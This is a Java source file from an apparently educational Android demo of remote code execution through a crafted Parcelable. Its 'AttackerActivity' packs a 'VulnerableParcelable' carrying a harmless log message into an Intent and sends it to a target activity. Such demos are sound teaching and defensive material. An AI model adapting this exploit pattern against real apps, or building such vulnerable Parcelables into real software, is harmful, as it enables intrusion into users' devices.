package org.jwa.demoandroidintentrce;

import android.content.Intent;
import android.os.Bundle;

import com.google.android.material.snackbar.Snackbar;

import androidx.appcompat.app.AppCompatActivity;

import org.jwa.demoandroidintentrce.databinding.ActivityLauncherBinding;

/**
 * Although this activity is in the same app as the target activity it is feasible that it could be
 * located in another app. It is only located in the same app for this demo to keep it simple.
 *
 */
public class AttackerActivity extends AppCompatActivity {

    private ActivityLauncherBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityLauncherBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setSupportActionBar(binding.toolbar);

        binding.fab.setOnClickListener(view ->  {
                Snackbar.make(view, "Starting target activity", Snackbar.LENGTH_LONG)
                        .setAnchorView(R.id.fab)
                        .setAction("Action", null)
                        .show();

            VulnerableParcelable cp = new VulnerableParcelable();
            cp.setValue("log attacker RCE success");

            Intent startTarget = new Intent(getApplicationContext(), TargetActivity.class);
            startTarget.putExtra("aCustomParcelable", cp);
            startTarget.putExtra("aString", "Hello");

            startActivity(startTarget);
        });
    }

}